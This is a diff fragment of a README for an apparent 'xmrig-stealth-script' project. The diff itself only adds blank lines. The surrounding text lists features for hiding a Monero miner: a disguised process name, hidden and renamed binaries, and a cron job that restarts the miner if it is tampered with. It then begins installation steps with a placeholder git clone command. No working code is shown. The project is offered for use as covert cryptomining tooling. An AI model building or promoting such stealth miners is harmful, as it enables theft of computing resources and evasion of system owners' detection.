@@ -6,6 +6,8 @@ Process Concealment: Modifies the process name and reduces CPU priority to disgu
 File Protection: Hides the XMRig binary and service files by renaming them and adjusting file permissions.
 Cron Job Setup: Ensures persistent monitoring and recovery of the XMRig service if any tampering is detected.
 Automatic Installation: A step-by-step installation guide for setting up XMRig with enhanced stealth features.
+
+
 Installation
 1.Clone the repository:
 git clone https://github.com/yourusername/xmrig-stealth-script.git
